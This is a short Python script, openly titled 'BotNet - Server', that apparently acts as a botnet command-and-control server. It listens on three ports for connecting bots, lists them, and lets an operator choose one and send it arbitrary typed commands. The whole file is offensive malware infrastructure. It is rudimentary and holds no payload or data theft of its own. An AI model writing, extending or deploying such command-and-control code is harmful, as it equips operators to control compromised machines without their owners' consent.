#! /usr/bin/python3

import socket, time
from threading import Thread
import pyfiglet, termcolor

banner = "BotNet - Server"
print(termcolor.colored(pyfiglet.figlet_format(banner), color="red", attrs=["bold"]))

threads = []
clients = []

def listen_for_bots(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("", port))
    sock.listen()
    bot, bot_address = sock.accept()
    clients.append(bot)

def main():
    print(termcolor.colored("[*] Server bot waiting for incoming connections", color="yellow", attrs=["bold"]))
    startig_port = 8080
    bots = 3

    for i in range(bots):
        t = Thread(target=listen_for_bots, args=(i + startig_port,), daemon=True)
        threads.append(t)
        t.start()
    # bot, bot_address = s.accept()
    run_cnc = True

    while run_cnc:
        if len(clients) != 0:
            for i, c in enumerate(clients):
                print("\t\t", i, "\t", c.getpeername())

            selected_client = int(input(termcolor.colored("[+] Select client by index: ", color="blue", attrs=["bold"])))
            bot = clients[selected_client]
            run_bot = True

            while run_bot:
                msg = input(termcolor.colored("[+] Write a Message: ", color="green", attrs=["bold"]))
                msg = msg.encode()
                bot.send(msg)

                if msg.decode() == "exit":
                    run_bot = False
            status = bot.recv(1024)

            if status == "disconnected".encode():
                bot.close()
                clients.remove(bot)
            print(termcolor.colored("[*] Message Sent Successfully!", color="green", attrs=["bold"]))

        else:
            print(termcolor.colored("[-] No clients connected", color="yellow", attrs=["bold"]))
            ans = input(termcolor.colored("[+] Do you want to exit? press [y/n]  ", color="green", attrs=["bold"]))

            if ans == "y":
                run_cnc = False

            else:
                run_cnc = True

if __name__ == "__main__":

    main()


